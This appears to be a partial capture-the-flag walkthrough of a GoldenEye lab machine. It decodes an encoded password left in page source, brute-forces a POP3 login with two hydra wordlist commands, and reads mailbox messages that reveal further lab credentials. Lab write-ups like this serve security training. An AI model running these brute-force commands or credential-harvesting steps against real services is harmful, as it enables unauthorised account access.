**ip:**
10.10.202.164

Default page:

![[Pasted image 20240725100319.png]]

Source code:

```php
var data = [
  {
    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
  }
];

//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//

var allElements = document.getElementsByClassName("typeing");
for (var j = 0; j < allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;

 
  var i = 0, isTag, text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
    var char = text.slice(-1);
    if (char === "<") isTag = true;
    if (char === ">") isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
}
```

Possible usernames:
Natalya, Boris

Password encoded for Boris:
&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;

Cyberchef:
![[Pasted image 20240725101000.png]]

Decoded pass:
InvincibleHack3r

![[Pasted image 20240725101121.png]]

```php
hydra -l boris -P /usr/share/seclists/SecLists-master/Passwords/2023-200_most_used_passwords.txt 10.10.202.164 -s 55007 pop3
```

Another try with a different wordlist

```php
hydra -I -l boris -P /usr/share/wordlists/fasttrack.txt 10.10.202.164 -s 55007 pop3
```

![[Pasted image 20240725110553.png]]

boris:
secret1!

![[Pasted image 20240725110708.png]]

https://www.shellhacks.com/retrieve-email-pop3-server-command-line/

![[Pasted image 20240725111630.png]]

![[Pasted image 20240725111711.png]]

![[Pasted image 20240725111752.png]]

```php
<root@127.0.0.1.goldeneye>
<natalya@ubuntu>
<alec@janus.boss>

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.
```

![[Pasted image 20240725113451.png]]

![[Pasted image 20240725113648.png]]

![[Pasted image 20240725113714.png]]

username: xenia
password: RCP90rulez!

![[Pasted image 20240725113756.png]]

```php
Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```




